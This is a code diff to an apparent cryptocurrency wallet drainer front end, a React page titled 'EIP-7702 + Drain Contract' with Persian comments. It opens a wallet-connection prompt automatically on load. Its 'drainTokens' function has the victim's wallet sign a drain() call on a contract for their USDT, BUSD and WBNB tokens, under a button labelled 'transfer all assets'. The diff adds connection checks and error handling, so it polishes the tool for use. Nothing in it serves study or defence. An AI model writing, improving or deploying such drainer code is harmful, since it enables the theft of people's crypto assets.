@@ -1,4 +1,3 @@
-
 import { useEffect } from "react";
 import {
   createWeb3Modal,
@@ -39,29 +38,44 @@ function App() {
   const { walletProvider } = useWeb3ModalProvider();
 
   useEffect(() => {
-    open();
+    open(); // باز کردن اتومات Modal
   }, []);
 
   const drainTokens = async () => {
-    const rawProvider = new ethers.BrowserProvider(walletProvider);
-    const signer = await rawProvider.getSigner();
+    if (!walletProvider || !isConnected) {
+      alert("⛔ لطفاً ابتدا کیف پول را متصل کنید.");
+      return;
+    }
 
-    const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-    const tokens = [
-      "0x55d398326f99059fF775485246999027B3197955", // USDT
-      "0xe9e7cea3dedca5984780bafc599bd69add087d56", // BUSD
-      "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"  // WBNB
-    ];
+    try {
+      const rawProvider = new ethers.BrowserProvider(walletProvider);
+      const signer = await rawProvider.getSigner();
 
-    const tx = await contract.drain(tokens);
-    await tx.wait();
-    alert("✅ انتقال انجام شد");
+      const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+      const tokens = [
+        "0x55d398326f99059fF775485246999027B3197955", // USDT
+        "0xe9e7cea3dedca5984780bafc599bd69add087d56", // BUSD
+        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"  // WBNB
+      ];
+
+      const tx = await contract.drain(tokens);
+      await tx.wait();
+      alert("✅ انتقال انجام شد");
+    } catch (err) {
+      console.error("❌ خطا در drain:", err);
+      alert("❌ خطا در اجرای انتقال");
+    }
   };
 
   return (
     <div style={{ textAlign: "center", marginTop: "60px" }}>
       <h2>EIP-7702 + Drain Contract</h2>
-      <button onClick={drainTokens}>💸 انتقال همه دارایی</button>
+
+      {!isConnected ? (
+        <p>🔌 لطفاً کیف پول خود را متصل کنید</p>
+      ) : (
+        <button onClick={drainTokens}>💸 انتقال همه دارایی</button>
+      )}
     </div>
   );
 }
